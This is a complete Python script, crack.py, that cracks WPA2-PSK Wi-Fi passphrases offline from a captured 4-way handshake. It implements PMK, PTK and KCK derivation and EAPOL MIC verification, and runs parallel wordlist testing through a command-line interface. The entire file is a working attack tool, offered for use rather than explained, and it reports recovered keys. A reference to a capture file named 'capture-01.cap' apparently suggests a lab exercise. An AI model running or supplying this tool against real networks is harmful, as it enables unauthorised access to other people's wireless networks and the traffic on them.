#!/usr/bin/env python3
"""
Offline dictionary attack against a captured WPA2-PSK 4-way handshake.

Our own implementation of PMK derivation (PBKDF2-HMAC-SHA1), PTK/KCK derivation
(PRF-512), and EAPOL MIC calculation/verification — no external cracking tool
is invoked. All settings live in config.py.

Usage:
    python3 crack.py info
    python3 crack.py single <password>
    python3 crack.py wordlist [--wordlist PATH] [--processes N] [--chunk-size N]
"""
import argparse
import hashlib
import hmac
import multiprocessing
import sys
import time
from pathlib import Path
from typing import Iterator, Optional

import config
from handshake import Handshake, extract_handshakes, mac_bytes_to_str, mac_str_to_bytes


# =============================================================================
# 1. PMK -> PTK -> KCK -> MIC
# =============================================================================
def derive_pmk(passphrase: str, ssid: str) -> bytes:
    """PMK = PBKDF2-HMAC-SHA1(passphrase, ssid, 4096, 32). 32 raw bytes."""
    return hashlib.pbkdf2_hmac("sha1", passphrase.encode("utf-8"), ssid.encode("utf-8"), 4096, 32)


def derive_ptk(pmk: bytes, ap_mac: bytes, sta_mac: bytes, anonce: bytes, snonce: bytes) -> bytes:
    """PTK via PRF-512 (HMAC-SHA1 loop). Returns 64 raw bytes."""
    data = min(ap_mac, sta_mac) + max(ap_mac, sta_mac) + min(anonce, snonce) + max(anonce, snonce)
    ptk = b""
    i = 0
    while len(ptk) < 64:
        ptk += hmac.new(
            pmk, b"Pairwise key expansion" + b"\x00" + data + bytes([i]), hashlib.sha1
        ).digest()
        i += 1
    return ptk[:64]


def derive_kck(ptk: bytes) -> bytes:
    return ptk[:16]


def compute_mic(kck: bytes, eapol_frame_mic_zeroed: bytes, key_descriptor_version: int) -> bytes:
    """Always returns 16 bytes."""
    if key_descriptor_version == 1:  # WPA / TKIP
        return hmac.new(kck, eapol_frame_mic_zeroed, hashlib.md5).digest()
    if key_descriptor_version == 2:  # WPA2 / CCMP (the case for capture-01.cap)
        return hmac.new(kck, eapol_frame_mic_zeroed, hashlib.sha1).digest()[:16]
    raise ValueError(
        f"key_descriptor_version={key_descriptor_version} (AES-128-CMAC / WPA3-style) "
        "is not implemented"
    )


def _mic_matches(handshake: Handshake, ssid: str, password: str) -> bool:
    pmk = derive_pmk(password, ssid)
    ptk = derive_ptk(pmk, handshake.ap_mac, handshake.sta_mac, handshake.anonce, handshake.snonce)
    kck = derive_kck(ptk)
    mic = compute_mic(kck, handshake.eapol_frame_mic_zeroed, handshake.key_descriptor_version)
    return mic == handshake.mic


def test_password(handshakes: list, ssid: str, password: str) -> bool:
    """
    Return True iff `password` is the AP's WPA2-PSK passphrase.

    `handshakes` is the full list from extract_handshakes(), not just one
    candidate: a lossy capture can hold several (ANonce, Msg2) pairings for
    the same station (see extract_handshakes' docstring), and only one of
    them is the one the station actually used — so every candidate is tried,
    and a match against any of them means the password is correct.
    """
    return any(_mic_matches(hs, ssid, password) for hs in handshakes)


# =============================================================================
# 2. Wordlist testing (streamed, parallel across CPU cores)
# =============================================================================
_WORKER_HANDSHAKES: Optional[list] = None
_WORKER_SSID: Optional[str] = None


def _init_worker(handshakes: list, ssid: str) -> None:
    global _WORKER_HANDSHAKES, _WORKER_SSID
    _WORKER_HANDSHAKES, _WORKER_SSID = handshakes, ssid


def _check_chunk(passwords: list) -> tuple:
    """Returns (matching_password_or_None, number_of_passwords_in_this_chunk)."""
    for pw in passwords:
        if not (config.MIN_PASSWORD_LEN <= len(pw) <= config.MAX_PASSWORD_LEN):
            continue
        if test_password(_WORKER_HANDSHAKES, _WORKER_SSID, pw):
            return pw, len(passwords)
    return None, len(passwords)


def _wordlist_chunks(path: Path, chunk_size: int) -> Iterator[list]:
    buf = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            pw = line.rstrip("\r\n")
            if pw:
                buf.append(pw)
            if len(buf) >= chunk_size:
                yield buf
                buf = []
    if buf:
        yield buf


def test_wordlist(
    handshakes: list,
    ssid: str,
    wordlist_path: Path,
    processes: Optional[int] = None,
    chunk_size: int = config.WORDLIST_CHUNK_SIZE,
    progress: bool = True,
) -> Optional[str]:
    """Stream wordlist_path in chunks across a process pool. Returns the
    matching password, or None if the whole wordlist was exhausted."""
    processes = processes or multiprocessing.cpu_count()
    start = time.time()
    tried = 0
    found = None

    with multiprocessing.Pool(
        processes=processes, initializer=_init_worker, initargs=(handshakes, ssid)
    ) as pool:
        chunks_done = 0
        for result, count in pool.imap_unordered(
            _check_chunk, _wordlist_chunks(wordlist_path, chunk_size)
        ):
            tried += count
            chunks_done += 1
            if result is not None:
                found = result
                pool.terminate()
                break
            if progress and chunks_done % 10 == 0:
                rate = tried / (time.time() - start)
                print(f"    {tried:,} tried   ({rate:,.0f} pwd/s)")

    if progress:
        elapsed = time.time() - start
        rate = tried / elapsed if elapsed > 0 else 0
        print(f"[*] ~{tried:,} candidates tried in {elapsed:.1f}s ({rate:,.0f} pwd/s)")

    return found


# =============================================================================
# 3. CLI
# =============================================================================
def _resolve_handshakes(args) -> list:
    capture_file = Path(args.capture) if args.capture else config.CAPTURE_FILE
    bssid = mac_str_to_bytes(args.bssid if args.bssid else config.BSSID)

    handshakes = extract_handshakes(capture_file, bssid)
    if not handshakes:
        print(
            f"[-] No crackable handshake (Msg1/Msg3 ANonce + Msg2) found for BSSID "
            f"{mac_bytes_to_str(bssid)} in {capture_file}"
        )
        sys.exit(2)
    return handshakes


def cmd_info(args) -> int:
    capture_file = Path(args.capture) if args.capture else config.CAPTURE_FILE
    ssid = args.ssid or config.SSID
    handshakes = _resolve_handshakes(args)
    hs = handshakes[0]

    print(f"[+] Capture file        : {capture_file}")
    print(f"[+] SSID                : {ssid}")
    print(f"[+] BSSID / AP MAC      : {mac_bytes_to_str(hs.ap_mac)}")
    print(f"[+] Candidate handshakes: {len(handshakes)}")
    print(f"[+] Best candidate:")
    print(f"    Client / STA MAC    : {mac_bytes_to_str(hs.sta_mac)}")
    print(f"    Key replay counter  : {hs.replay_counter}")
    print(f"    Complete 4-way      : {hs.is_complete_4way}")
    print(f"    Key descriptor ver  : {hs.key_descriptor_version}")
    print(f"    ANonce              : {hs.anonce.hex()}")
    print(f"    SNonce              : {hs.snonce.hex()}")
    print(f"    Captured MIC        : {hs.mic.hex()}")
    return 0


def cmd_single(args) -> int:
    ssid = args.ssid or config.SSID
    handshakes = _resolve_handshakes(args)
    ok = test_password(handshakes, ssid, args.password)
    if ok:
        print(f"[+] MATCH   -> password is: {args.password}")
        return 0
    print(f"[-] NO MATCH -> {args.password!r} is not the password")
    return 1


def cmd_wordlist(args) -> int:
    ssid = args.ssid or config.SSID
    wordlist_path = Path(args.wordlist) if args.wordlist else config.WORDLIST_FILE
    if not wordlist_path.exists():
        print(f"[-] Wordlist not found: {wordlist_path}")
        sys.exit(2)

    handshakes = _resolve_handshakes(args)
    print(f"[*] Cracking against SSID '{ssid}' using wordlist {wordlist_path}")
    print(f"[*] Testing each password against {len(handshakes)} candidate handshake(s)")
    processes = args.processes or multiprocessing.cpu_count()
    print(f"[*] Using {processes} process(es)")

    found = test_wordlist(
        handshakes, ssid, wordlist_path, processes=args.processes, chunk_size=args.chunk_size
    )
    if found:
        print(f"\n[+] KEY FOUND! -> {found}")
        return 0
    print("\n[-] Password not found in wordlist.")
    return 1


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="crack.py", description=__doc__)
    sub = parser.add_subparsers(dest="mode", required=True)

    def add_common(p):
        p.add_argument("--capture", help=f"capture file (default: {config.CAPTURE_FILE})")
        p.add_argument("--ssid", help=f"network SSID / PBKDF2 salt (default: {config.SSID})")
        p.add_argument("--bssid", help=f"target AP BSSID (default: {config.BSSID})")

    p_info = sub.add_parser("info", help="parse the capture and print the extracted handshake")
    add_common(p_info)
    p_info.set_defaults(func=cmd_info)

    p_single = sub.add_parser("single", help="test one candidate password")
    p_single.add_argument("password")
    add_common(p_single)
    p_single.set_defaults(func=cmd_single)

    p_wordlist = sub.add_parser("wordlist", help="test every password in a wordlist file")
    p_wordlist.add_argument("--wordlist", help=f"wordlist file (default: {config.WORDLIST_FILE})")
    p_wordlist.add_argument("--processes", type=int, default=None, help="worker processes")
    p_wordlist.add_argument(
        "--chunk-size", type=int, default=config.WORDLIST_CHUNK_SIZE, help="passwords per work unit"
    )
    add_common(p_wordlist)
    p_wordlist.set_defaults(func=cmd_wordlist)

    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
